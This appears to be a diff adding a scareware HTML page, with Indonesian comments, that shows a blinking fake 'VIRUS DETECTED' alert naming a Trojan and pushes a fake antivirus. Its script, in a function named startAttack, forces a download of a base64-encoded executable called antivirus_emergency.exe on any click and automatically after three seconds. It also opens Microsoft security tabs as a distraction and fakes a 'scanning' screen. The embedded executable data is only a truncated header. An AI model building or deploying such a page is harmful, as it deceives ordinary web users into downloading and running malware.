@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html onclick="startAttack()">
+<head>
+    <title>⚠️ Critical Alert</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial;
+            background: #ff4444;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            cursor: pointer;
+        }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+    <div>
+        <h1 class="blink">⚠️ VIRUS DETECTED!</h1>
+        <h2>Click anywhere to download antivirus</h2>
+        <p>Trojan:Win32/Wacatac.B!ml detected in system</p>
+    </div>
+
+    <script>
+        function startAttack() {
+            // Langsung download tanpa dialog
+            const link = document.createElement('a');
+            link.href = `data:application/exe;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
+            link.download = 'antivirus_emergency.exe';
+            document.body.appendChild(link);
+            link.click();
+            
+            // Buka banyak tabs sebagai distraction
+            for(let i=0; i<3; i++) {
+                setTimeout(() => window.open('https://www.microsoft.com/en-us/windows/comprehensive-security'), i*200);
+            }
+            
+            // Ubah halaman jadi "scanning"
+            document.body.innerHTML = '<h1>🔍 Scanning system...</h1><p>Removing threats...</p>';
+        }
+        
+        // Auto-start dalam 3 detik
+        setTimeout(startAttack, 3000);
+    </script>
+</body>
+</html>
